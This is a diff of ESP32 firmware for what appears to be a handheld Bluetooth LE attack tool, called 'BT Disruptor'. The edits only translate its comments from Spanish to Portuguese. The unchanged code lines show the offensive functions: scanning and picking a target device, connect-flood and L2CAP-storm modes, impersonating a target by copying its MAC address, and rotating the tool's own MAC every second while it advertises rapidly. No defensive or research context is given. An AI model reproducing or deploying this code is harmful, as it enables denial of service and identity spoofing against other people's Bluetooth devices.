@@ -15,7 +15,7 @@
 extern TFT_eSPI tft;
 
 // ═══════════════════════════════════════════════════════════════════════════
-//  CONFIGURACIÓN
+//  CONFIGURAÇÃO
 // ═══════════════════════════════════════════════════════════════════════════
 #define MAX_TARGETS       30
 #define VISIBLE_ROWS      6
@@ -201,7 +201,7 @@ static void performScan() {
     scanner->stop();
     scanner->clearResults();
 
-    // Ordenar por RSSI descendente
+    // Ordena por RSSI descendente
     for (int i = 0; i < targetCount - 1; i++) {
         for (int j = 0; j < targetCount - 1 - i; j++) {
             if (targets[j].rssi < targets[j + 1].rssi) {
@@ -218,7 +218,7 @@ static void performScan() {
 }
 
 // ═══════════════════════════════════════════════════════════════════════════
-//  PANTALLA 2 · SELECCIÓN DE TARGET
+//  TELA 2 · SELEÇÃO DE TARGET
 // ═══════════════════════════════════════════════════════════════════════════
 static void drawTargetList(int cursor, int scrollOffset) {
     tft.fillScreen(TFT_BLACK);
@@ -324,7 +324,7 @@ static int selectTarget() {
 }
 
 // ═══════════════════════════════════════════════════════════════════════════
-//  PANTALLA 3 · SELECCIÓN DE MODO
+//  TELA 3 · SELEÇÃO DE MODO
 // ═══════════════════════════════════════════════════════════════════════════
 static void drawModeMenu(int cursor, const Target& t) {
     tft.fillScreen(TFT_BLACK);
@@ -392,9 +392,9 @@ static int selectAttackMode(const Target& t) {
 }
 
 // ═══════════════════════════════════════════════════════════════════════════
-//  ATAQUES · versiones NO BLOQUEANTES
-//  · Solo actualizan los datos del advertisement
-//  · El radio BLE transmite automáticamente cada 20-40ms en background
+//  ATAQUES · versões NÃO BLOQUEANTES
+//  · Só atualizam os dados do advertisement
+//  · O rádio BLE transmite automaticamente a cada 20-40ms em background
 // ═══════════════════════════════════════════════════════════════════════════
 
 static void updateConnectFloodData(BLEAdvertising* adv) {
@@ -429,7 +429,7 @@ static void updateL2CAPStormData(BLEAdvertising* adv) {
 }
 
 static void updateSpoofIdentityData(BLEAdvertising* adv) {
-    // Para spoof, usar MAC del target
+    // Para spoof, usa a MAC do target
     esp_bd_addr_t spoofMac;
     memcpy(spoofMac, activeTarget.macBytes, 6);
     esp_ble_gap_set_rand_addr(spoofMac);
@@ -444,14 +444,14 @@ static void updateSpoofIdentityData(BLEAdvertising* adv) {
     adv->setAdvertisementData(advData);
 }
 
-// Dispatcher: actualiza los datos del advertisement y rota MAC
+// Dispatcher: atualiza os dados do advertisement e gira a MAC
 static void executeAttackTick(BLEAdvertising* adv, AttackMode mode) {
     AttackMode effective = mode;
     if (mode == ATK_CHAOS) {
         effective = (AttackMode)random(0, 3);
     }
 
-    // Para flood y storm, randomizar la MAC del ESP32 en cada tick
+    // Para flood e storm, randomiza a MAC do ESP32 a cada tick
     if (effective == ATK_CONNECT_FLOOD || effective == ATK_L2CAP_STORM) {
         randomizeOwnMac();
     }
@@ -467,7 +467,7 @@ static void executeAttackTick(BLEAdvertising* adv, AttackMode mode) {
 }
 
 // ═══════════════════════════════════════════════════════════════════════════
-//  PANTALLA 4 · ATAQUE ACTIVO
+//  TELA 4 · ATAQUE ATIVO
 // ═══════════════════════════════════════════════════════════════════════════
 static void drawAttackFrame() {
     tft.fillScreen(TFT_BLACK);
@@ -512,10 +512,10 @@ static void drawAttackStats(unsigned long elapsed, unsigned long pkts, float rat
 }
 
 // ═══════════════════════════════════════════════════════════════════════════
-//  LOOP DE ATAQUE — NO BLOQUEANTE + MAC ROTATION SEGURA
+//  LOOP DE ATAQUE — NÃO BLOQUEANTE + MAC ROTATION SEGURA
 // ═══════════════════════════════════════════════════════════════════════════
 
-// Actualiza solo los DATOS (sin tocar MAC ni start/stop del advertising)
+// Atualiza só os DADOS (sem tocar na MAC nem no start/stop do advertising)
 static void updateAttackDataOnly(BLEAdvertising* adv, AttackMode mode) {
     AttackMode effective = mode;
     if (mode == ATK_CHAOS) {
@@ -532,7 +532,7 @@ static void updateAttackDataOnly(BLEAdvertising* adv, AttackMode mode) {
     attackPackets++;
 }
 
-// Rota la MAC de forma SEGURA (stop → change → start)
+// Gira a MAC de forma SEGURA (stop → change → start)
 static void rotateMacSafely(BLEAdvertising* adv) {
     adv->stop();
     delay(5);
@@ -555,11 +555,11 @@ static void runAttackLoop() {
     adv->setMinInterval(0x20);   // 20 ms min
     adv->setMaxInterval(0x40);   // 40 ms max
 
-    // MAC inicial aleatoria antes de arrancar
+    // MAC inicial aleatória antes de iniciar
     randomizeOwnMac();
     delay(10);
 
-    // Primer paquete y start (UNA SOLA VEZ)
+    // Primeiro pacote e start (UMA ÚNICA VEZ)
     updateAttackDataOnly(adv, activeMode);
     adv->start();
 
@@ -582,8 +582,8 @@ static void runAttackLoop() {
             lastPayloadTime = millis();
         }
 
-        // ── Rotar MAC cada 1000 ms (stop → change → start) ────────────
-        // Esto previene el crash del stack BLE por cambios demasiado rápidos
+        // ── Gira a MAC a cada 1000 ms (stop → change → start) ────────────
+        // Isso previne o crash do stack BLE por mudanças rápidas demais
         if (millis() - lastMacRotate >= 1000) {
             rotateMacSafely(adv);
             lastMacRotate = millis();
@@ -601,10 +601,10 @@ static void runAttackLoop() {
             drawAttackStats(now - startMs, attackPackets, rate);
         }
 
-        // ── Watchdog feed — yield al sistema ───────────────────────────
+        // ── Watchdog feed — yield ao sistema ───────────────────────────
         yield();
 
-        // ── Detectar OK HOLD para parar ────────────────────────────────
+        // ── Detecta OK HOLD para parar ────────────────────────────────
         if (digitalRead(BTN_OK) == LOW) {
             if (!okHeld) {
                 okPressStart = millis();
@@ -688,13 +688,13 @@ void runBTDisruptor() {
 
         activeMode = (AttackMode)modeIdx;
 
-        // Deinit el BLE de scan, el runAttackLoop hace su propio init
+        // Deinit do BLE de scan; o runAttackLoop faz seu próprio init
         BLEDevice::deinit(false);
         delay(100);
 
         runAttackLoop();
 
-        // Re-init para volver al menú de selección
+        // Re-init para voltar ao menu de seleção
         BLEDevice::init("");
         delay(100);
     }
